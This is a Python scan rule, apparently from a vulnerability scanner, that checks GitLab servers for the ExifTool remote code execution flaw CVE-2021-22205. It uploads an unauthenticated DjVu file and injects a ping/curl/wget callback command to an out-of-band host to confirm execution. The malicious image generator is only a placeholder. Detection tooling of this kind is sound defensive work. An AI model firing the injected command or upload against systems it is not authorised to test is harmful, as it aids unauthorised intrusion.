# Filename: VulnerabilityChecks/GitLabExifToolRCECVE202122205ScanRule.py

import asyncio
import logging
import random
import string
import uuid
import urllib.parse
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple, TYPE_CHECKING, Set

import aiohttp

if TYPE_CHECKING:
    from asyncio import Queue # For type hinting

@dataclass
class GitLabExifToolRCEAlert:
    cwe_id: int = 78
    wasc_id: int = 31
    name: str = "GitLab Remote Code Execution via ExifTool (CVE-2021-22205)"
    description: str = (
        "GitLab CE/EE versions 11.9 and later are affected by a vulnerability in how ExifTool handles "
        "specially crafted image files. An unauthenticated attacker can upload a malicious image that, "
        "when processed, leads to remote code execution on the GitLab server."
    )
    uri: str = ""
    attack_details: Dict[str, Any] = field(default_factory=dict)
    evidence: str = ""
    other_info: str = ""
    solution: str = (
        "Upgrade GitLab to version 13.8.8, 13.9.6, 13.10.3, or later. "
        "Ensure ExifTool is also updated if managed separately, though GitLab bundles its version. "
        "Restrict access to GitLab instances and monitor for suspicious upload activities."
    )
    reference: str = (
        "CVE-2021-22205\n"
        "GitLab Critical Security Release: https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/\n"
        "PoC examples can be found on GitHub and security blogs."
    )
    risk: int = 4
    confidence: int = 2 # Medium (OAST interaction is needed for high confidence)
    # Class level constant for confidence
    CONFIDENCE_MEDIUM: int = 2

    cve_id: str = "CVE-2021-22205"
    oast_interaction_id: Optional[str] = None
    alert_tags: Dict[str, str] = field(default_factory=lambda: {
        "CVE": "CVE-2021-22205",
        "OWASP_2021_A03": "Injection",
        "OWASP_2021_A06": "Vulnerable and Outdated Components",
        "WSTG_V42_INPV_12": "Testing_for_Command_Injection",
        "OAST": "Required"
    })

    def as_dict(self) -> Dict[str, Any]:
        tags = self.alert_tags.copy()
        if self.oast_interaction_id:
            tags["OAST_Interaction"] = "Attempted"
        
        return {
            "vulnerability_type": "GitLab_ExifTool_RCE_CVE-2021-22205",
            "type": self.name,
            "detail": self.description,
            "payload_used": f"Malicious image with embedded command: {self.attack_details.get('payload_command', 'N/A')}",
            "injection_point_info": f"File upload to endpoint: {self.attack_details.get('endpoint_attacked', 'N/A')}",
            "url_tested": self.uri,
            "severity": {1: "Info", 2: "Low", 3: "Medium", 4: "High"}.get(self.risk, "Unknown"),
            "confidence": {1: "Low", 2: "Medium", 3: "High"}.get(self.confidence, "Unknown"),
            "evidence": self.evidence,
            "solution": self.solution,
            "reference": self.reference,
            "cwe_id": self.cwe_id,
            "wasc_id": self.wasc_id,
            "alert_tags": tags,
            "other_info": self.other_info
        }

UPLOAD_ENDPOINT_USER = "/uploads/user" 

def generate_malicious_djvu_image_bytes(os_command_for_oast: str) -> bytes:
    logging.getLogger(__name__).error(
        "GitLab CVE-2021-22205: `generate_malicious_djvu_image_bytes` is a placeholder. "
        "A real malicious image is needed for exploitation."
    )
    return b"PLACEHOLDER_MALICIOUS_IMAGE_CONTENT_FOR_" + os_command_for_oast.encode('utf-8')


class GitLabExifToolRCECVE202122205ScanRule:
    tech_required: Set[str] = {"GitLab"} # Specific to GitLab
    def __init__(self,
                 parent_logger: Optional[logging.Logger] = None,
                 oast_base_url: Optional[str] = None,
                 http_timeout: float = 20.0,
                 active_scan_async_q: Optional['Queue'] = None # Added parameter
                 ):
        self.logger = parent_logger or logging.getLogger(__name__)
        self.oast_base_url = self._normalize_oast_url(oast_base_url) if oast_base_url else None
        self.http_timeout = http_timeout
        self.active_scan_async_q = active_scan_async_q # Store the queue
        
        if not self.oast_base_url:
            self.logger.warning("GitLab ExifTool RCE Scan: OAST base URL not configured. Effective RCE confirmation is not possible.")

    def _normalize_oast_url(self, url: str) -> str:
        parsed = urllib.parse.urlparse(url)
        return parsed.netloc if parsed.netloc else parsed.path.split('/')[0]

    def _get_oast_command(self, unique_id: str) -> str:
        if not self.oast_base_url:
            return f"echo NO_OAST_CONFIGURED_FOR_{unique_id}"
        
        oast_target = f"{unique_id}.{self.oast_base_url}"
        return f"(ping -c 1 {oast_target} || curl -s -m 3 http://{oast_target}/gitlab_rce || wget -T 3 -qO- http://{oast_target}/gitlab_rce_wget)"

    async def _upload_malicious_file(
        self,
        session: aiohttp.ClientSession,
        target_upload_url: str,
        malicious_filename: str,
        malicious_file_bytes: bytes,
        original_headers: Optional[Dict[str, str]] = None
    ) -> Tuple[Optional[str], int]:
        
        headers_to_send = (original_headers or {}).copy()
        if "User-Agent" not in headers_to_send:
             headers_to_send["User-Agent"] = random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
            ])
        
        form_data = aiohttp.FormData()
        form_data.add_field(
            'file',
            malicious_file_bytes,
            filename=malicious_filename,
            content_type='image/vnd.djvu'
        )
        
        self.logger.debug(f"GitLab ExifTool RCE: Uploading '{malicious_filename}' to {target_upload_url}")
        
        text_content: Optional[str] = None
        status_code: int = -1

        try:
            timeout = aiohttp.ClientTimeout(total=self.http_timeout)
            async with session.post(
                target_upload_url, data=form_data, headers=headers_to_send,
                timeout=timeout, allow_redirects=False, ssl=False
            ) as resp:
                text_content = await resp.text(errors='replace')
                status_code = resp.status
                self.logger.debug(f"GitLab ExifTool RCE: Upload response from {target_upload_url}: Status {status_code}")
        except Exception as e:
            self.logger.warning(f"GitLab ExifTool RCE: Upload to {target_upload_url} failed: {type(e).__name__} - {e}")
        
        return text_content, status_code

    async def _queue_alert(self, alert_instance: GitLabExifToolRCEAlert):
        if self.active_scan_async_q:
            try:
                await self.active_scan_async_q.put({"type": "active_scan_alert", "alert": alert_instance.as_dict()})
            except Exception as e_queue:
                self.logger.error(f"Failed to put GitLab ExifTool RCE alert onto async queue: {e_queue}")
        else:
            self.logger.warning("active_scan_async_q not available in GitLab ExifTool RCE rule, cannot queue alert.")

    async def scan(
        self,
        gitlab_base_url: str,
        original_headers: Dict[str, str],
        aiohttp_session: aiohttp.ClientSession,
        # The following are part of a more generic signature but less used by this specific rule
        original_cookies: Optional[Dict[str, str]] = None,
        page_specific_technologies: Optional[List[str]] = None,
        injection_details: Optional[Dict[str, Any]] = None,
        original_page_content_for_baseline_errors: Optional[str] = None
    ) -> None: # Changed return type to None
        
        if not self.oast_base_url:
            self.logger.warning("GitLab ExifTool RCE scan: OAST base URL not configured. Cannot reliably confirm RCE. Skipping.")
            return
        if not self.active_scan_async_q:
            self.logger.warning("GitLab ExifTool RCE scan skipped: active_scan_async_q not configured.")
            return

        if not gitlab_base_url.endswith('/'):
            gitlab_base_url += '/'
        
        self.logger.info(f"Starting GitLab ExifTool RCE (CVE-2021-22205) scan for: {gitlab_base_url}")

        unique_oast_id = str(uuid.uuid4())
        os_command_for_oast = self._get_oast_command(unique_oast_id)
        
        malicious_image_bytes = generate_malicious_djvu_image_bytes(os_command_for_oast)
        if b"PLACEHOLDER_MALICIOUS_IMAGE_CONTENT_FOR_" in malicious_image_bytes:
            self.logger.error("GitLab ExifTool RCE scan: Actual malicious image generation is needed. Using placeholder will not work.")
            # For a real scan, might return here. For testing flow, continue.

        malicious_filename = f"exploit_{unique_oast_id[:8]}.djvu"
        endpoints_to_try = [UPLOAD_ENDPOINT_USER]
        alerts_generated_count = 0

        for endpoint_suffix in endpoints_to_try:
            target_upload_url = urllib.parse.urljoin(gitlab_base_url, endpoint_suffix.lstrip('/'))
            
            self.logger.info(f"GitLab ExifTool RCE: Attempting upload to {target_upload_url}")
            
            _, status_code = await self._upload_malicious_file(
                aiohttp_session, target_upload_url, malicious_filename,
                malicious_image_bytes, original_headers
            )

            if status_code in [200, 201, 202, 301, 302, 303, 307, 308]:
                self.logger.info(f"GitLab ExifTool RCE: File potentially uploaded to {target_upload_url} (status {status_code}). OAST interaction check required for ID {unique_oast_id}.")
                alert = GitLabExifToolRCEAlert(
                    uri=gitlab_base_url,
                    attack_details={
                        "endpoint_attacked": target_upload_url,
                        "filename_uploaded": malicious_filename,
                        "payload_command": os_command_for_oast
                    },
                    evidence=f"Malicious image uploaded to {target_upload_url}. OAST interaction required for confirmation (ID: {unique_oast_id}).",
                    other_info=f"OAST Interaction ID: {unique_oast_id}. Command attempted: {os_command_for_oast}",
                    confidence=GitLabExifToolRCEAlert.CONFIDENCE_MEDIUM,
                    oast_interaction_id=unique_oast_id
                )
                await self._queue_alert(alert)
                alerts_generated_count += 1
                break 
            elif status_code != -1:
                self.logger.info(f"GitLab ExifTool RCE: Upload to {target_upload_url} failed with status {status_code}.")

        if alerts_generated_count > 0:
            self.logger.info(f"GitLab ExifTool RCE (CVE-2021-22205) scan for {gitlab_base_url} completed. Found {alerts_generated_count} potential alerts (OAST verification needed).")
        else:
            self.logger.info(f"GitLab ExifTool RCE (CVE-2021-22205) scan for {gitlab_base_url} completed. No alerts generated.")
        return